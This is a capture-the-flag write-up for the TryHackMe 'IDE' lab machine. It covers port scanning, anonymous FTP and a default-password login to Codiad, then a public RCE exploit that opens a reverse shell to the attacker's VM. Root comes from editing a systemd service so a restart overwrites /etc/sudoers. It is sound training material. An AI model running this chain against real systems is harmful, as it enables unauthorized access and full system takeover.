**Category:** Linux

**Difficulty:** Easy

**Status:** Completed

**Link:** https://tryhackme.com/room/ide

---

## 1. Challenge Description

An easy box to polish your enumeration skills!

## 2. Enumeration

### Basic scan

```bash
nmap -sS -p- -Pn <IP>
```

![image.png](attachment:6602acd9-9740-4ff8-88ce-9b4c893116dc:image.png)

### Detail scan

```bash
nmap -T4 -A -p 21,22,80,62337 <IP>
```

![image.png](attachment:cbb121e9-c604-4548-a149-943b3b1ca922:image.png)

## 3. **FTP Enumeration**

```bash
ftp <IP>
# name : anonymous
#password : empty
```

![image.png](attachment:9de29a8d-5959-48ef-b799-82cc70a7929b:image.png)

```bash
ls -la
cd ...
ls -la
get -
```

![image.png](attachment:0a525e6e-37ab-4dff-be9d-057a5b852f73:image.png)

```bash
cp - test
cat test
```

![image.png](attachment:0bc24978-0b5a-401d-97bb-0754195d1ed0:image.png)

> It appears that `john` and `drac` are potential users in the target system.
> 

## 4.HTTP Port 62337

 

![image.png](attachment:b623a484-55ca-476b-9adf-2aa8ac4f8ddd:image.png)

> the user is `john` and default password is `password`
> 

![image.png](attachment:0229a5e7-7f19-4b95-aa4b-de68595b920f:image.png)

### Codiad 2.8.4

> Search on Codiad 2.8.4 exploit and download the py file
> 

[Codiad 2.8.4 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49705)

### Usage

![image.png](attachment:4d63a04f-ddbc-4b24-aa56-28401305a2d9:image.png)

```bash
nc -lvnp 4444 #root privilege
```

```bash
└─$ python3 exploit.py http://<IP>:62337/ john password <MY VM IP> 4444 linux
```

### User flag

![image.png](attachment:42d0de30-696a-4326-b401-fc0f11919ad3:image.png)

```bash
cd home/drac
ls -lna
```

```bash
cat user.txt
www-data@ide:/home/drac$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

```bash
cat .bash_history
```

![image.png](attachment:0244dbf7-2c65-4d9b-8370-f08cd2c4d239:image.png)

```bash
ssh drac@IP 
#password is TH...
```

![image.png](attachment:d8bf0f51-5521-4b7c-9697-e2f00a2b9200:image.png)

### Root flag

![image.png](attachment:55056df0-9c28-4f69-a705-6efa2e9bbd8f:image.png)

> We can executo /usr/sbin/service vsftpd restart as sudo so we can try to change the vsftpd.service to execute a reverse shell when we restart the service.
> 

```bash
drac@ide:~$ cat /lib/systemd/system/vsftpd.service
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
```

```bash
nano /lib/systemd/system/vsftpd.service
```

```bash
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/bin/sh -c 'echo "drac ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target

```

```bash
 /usr/sbin/service vsftpd restart
```

```bash
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password:
==== AUTHENTICATION COMPLETE ===

drac@ide:~$ sudo -l
User drac may run the following commands on ide:
    (root) NOPASSWD: ALL
```

```bash
drac@ide:~$ sudo su
root@ide:/home/drac# cd
root@ide:~# ls
root.txt
```
